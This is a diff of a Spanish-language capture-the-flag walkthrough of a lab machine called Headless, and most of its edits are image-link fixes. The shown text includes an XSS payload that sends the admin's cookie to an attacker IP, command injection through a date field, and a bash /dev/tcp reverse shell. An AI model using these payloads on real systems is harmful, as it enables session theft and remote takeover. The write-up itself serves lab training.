@@ -155,7 +155,7 @@ Upgrade-Insecure-Requests: 1
 fname=tets&lname=test&email=test%40test.com&phone=test&message=<img+src%3d"http%3a//10.10.16.36%3a4545/symmetry3">
 ```
 
-![Pasted image 20240724110113.png](../assets/images-Headless/Headless3.png)
+![Pasted image 20240724110113.png](../assets/images-Headless/Headless4.png)
 
 Nos muestra un mensaje de `Hacking Attempt Detected`, donde nos indica que los administradores nos investigaran.
 - En este punto verifique con `gobuster` si no hay otras paginas o directorios: 
@@ -179,7 +179,9 @@ Starting gobuster in directory enumeration mode
 /dashboard            (Status: 500) [Size: 265]
 ```
 Como vemos tenemos `/dashboard` que da un código de estado 500(Internal Server Error), pero visitando este directorio vemos que realmente es código de estado 401(Unauthorized)
-![[Pasted image 20240724112252.png]]
+
+![Pasted image 20240724112252.png](../assets/images-Headless/Headless5.png)
+
 Por lo tanto decido volver a intentar a inyectar payloads `XSS` de [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) luego de varios intentemos vemos que funciona.
 ```
 <script>document.location="http://10.10.16.36/xss-76.js?cookie="+btoa(document.cookie);</script>
@@ -203,7 +205,8 @@ Upgrade-Insecure-Requests: 1
 
 fname=tets&lname=test&email=test%40test.com&phone=test&message=<script>document.location%3d"http%3a//10.10.16.36/xss-76.js%3fcookie%3d"%2bbtoa(document.cookie)%3b</script>  
 ```
-![[Pasted image 20240724114531.png]]
+![Pasted image 20240724114531.png](../assets/images-Headless/Headless6.png)
+
 Como podemos ver obtenemos la cookie:
 ```shell
 ❯ python3 -m http.server 80
@@ -220,13 +223,18 @@ Vemos que esta esta encodeada en base64 por lo tanto la decodifico:
 is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
 ```
 Al parecer tenemos la cookie de un admin, si recordamos tenemos un directorio que es dashboard si vamos a este y en Firefox presiono(Ctrl+Shift+C) y vamos a Storge, vemos que el sitio tiene una cookie con el parametro is_admin. Entonces remplazamos el valor de la cookie con el valor de la cookie que obtuvimos 
-![[Pasted image 20240724115949.png]]
+
+![Pasted image 20240724115949.png](../assets/images-Headless/Headless7.png)
 
 # [](#header-4)Comand Injection RCE
 Si recargamos vemos la siguiente
-![[Pasted image 20240724120010.png]]
+
+![[Pasted image 20240724120010.png]](../assets/images-Headless/Headless8.png)
+
 Si clickeamos en `Generate Report` nos muestra el siguiente mensaje
-![[Pasted image 20240724120054.png]]
+
+![Pasted image 20240724120054.png](../assets/images-Headless/Headless9.png)
+
 Por lo que podemos llegar a pensar que al presionar `Generate Report` se esta ejecutando algún comando a nivel de sistema, entonces interceptamos la petición con Burpsuite para ver realmente lo que esta pasando:
 ```
 POST /dashboard HTTP/1.1
@@ -266,7 +274,9 @@ Upgrade-Insecure-Requests: 1
 date=2023-09-15; whoami
 ```
 Vemos efectivamente que podemos inyectar comandos
-![[Pasted image 20240724121409.png]]
+
+![Pasted image 20240724121409.png](../assets/images-Headless/Headless10.png)
+
 Por lo que procedo a enviarme una reverse shell, a esto en la solicitud que vamos a enviar lo URL encodeamos
 ```
 bash -c "bash -i >& /dev/tcp/10.10.16.36/443 0>&1"
@@ -330,7 +340,7 @@ dvir@headless:~/app$ stty rows 29 columns 128
 ```
 - En stty rows columns deberan fijarse la proprosiones de su consola en una ventana aparte con
 `stty size`
-![[Pasted image 20240724122717.png]]
+[Pasted image 20240724122717.png](../assets/images-Headless/Headless11.png)
 Ahora vemos la flags del usario
 ```bash
 dvir@headless:~$ cat user.txt 
